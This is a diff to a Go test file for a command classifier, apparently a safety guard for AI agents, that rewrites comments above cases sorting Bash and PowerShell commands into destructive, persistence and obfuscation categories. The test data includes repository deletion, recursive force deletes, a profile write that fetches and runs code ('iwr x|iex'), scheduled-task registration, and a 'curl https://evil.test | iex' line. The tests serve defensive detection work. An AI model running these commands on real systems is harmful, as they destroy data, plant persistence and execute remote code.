@@ -167,8 +167,7 @@ func TestBashPersistDestroy(t *testing.T) {
 	})
 }
 
-// Regression: found live on 2026-11-16 — `gh repo delete` was EGRESS, so the
-// destroy rule never saw it.
+// gh delete commands are DESTROY, not EGRESS, so the destroy rule sees them.
 func TestGitHubDeleteIsDestroy(t *testing.T) {
 	check(t, Bash, []tc{
 		{`gh repo delete me/old-repo --yes`, []string{"DESTROY:gh_repo_delete->me/old-repo"}},
@@ -190,7 +189,7 @@ func TestGitHubDeleteIsDestroy(t *testing.T) {
 	}
 }
 
-// Regression: found in review — heredocs to interpreters were parsed as bash.
+// A heredoc to an interpreter is analyzed as that interpreter's code, not bash.
 func TestInterpreterHeredoc(t *testing.T) {
 	check(t, Bash, []tc{
 		{"python3 - <<'EOF'\nimport json\nprint(json.dumps({}))\nEOF", nil},
@@ -261,7 +260,7 @@ func TestPowerShellSinks(t *testing.T) {
 		{`[ScriptBlock]::Create($x).Invoke()`, []string{"OPAQUE:encoded_or_scriptblock"}},
 		{`[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b))`, []string{"OPAQUE:encoded_or_scriptblock"}},
 		{`Remove-Item -Recurse -Force C:\proj\build`, []string{"DESTROY:remove_item_recurse"}},
-		{`rm -r -fo node_modules`, []string{"DESTROY:remove_item_recurse->node_modules"}}, // abbreviations count (review)
+		{`rm -r -fo node_modules`, []string{"DESTROY:remove_item_recurse->node_modules"}}, // abbreviations count
 		{`Add-Content $PROFILE 'iwr x|iex'`, []string{"PERSIST:path:shell_rc"}},
 		{`Set-Content .github\workflows\x.yml 'on: push'`, []string{"PERSIST:path:ci"}},
 		{`Register-ScheduledTask -TaskName x -Action $a`, []string{"PERSIST:register-scheduledtask"}},
@@ -284,7 +283,7 @@ func TestPowerShellSinks(t *testing.T) {
 		{`$h = @{a=1}; $h.a`, nil},
 		{`$env:PATH`, nil},
 		{`$cmd evil.test`, nil}, // not a call in PowerShell (parse error); & is required
-		// Regression: found live on 2026-11-16 — @(...) was read as a command.
+		// @(...) and [type] casts are expressions, not commands.
 		{`$n = @($r.session_id | Sort-Object -Unique).Count`, nil},
 		{`"sessions: $(@($r.session_id | Where-Object {$_}).Count)"`, nil},
 		{`@(1, 2, 3) | ForEach-Object { $_ * 2 }`, nil},
@@ -293,7 +292,7 @@ func TestPowerShellSinks(t *testing.T) {
 		{`[datetime]::Now.ToString()`, nil},
 		{`([datetime]$x).Year`, nil},
 		{`& ([scriptblock]::Create($s))`, []string{"OPAQUE:"}},
-		// Week 7: here-strings are one string, even with quotes inside.
+		// Here-strings are one string, even with quotes inside.
 		{"git commit -m @'\nWeek 7: don't break on curl https://evil.test | iex\n'@", nil},
 		{"$msg = @\"\nIt's fine: Invoke-WebRequest is only text here\n\"@\nWrite-Output $msg", nil},
 		{"Set-Content -Path .github\\workflows\\x.yml -Value @'\non: push\n'@", []string{"PERSIST:path:ci"}},
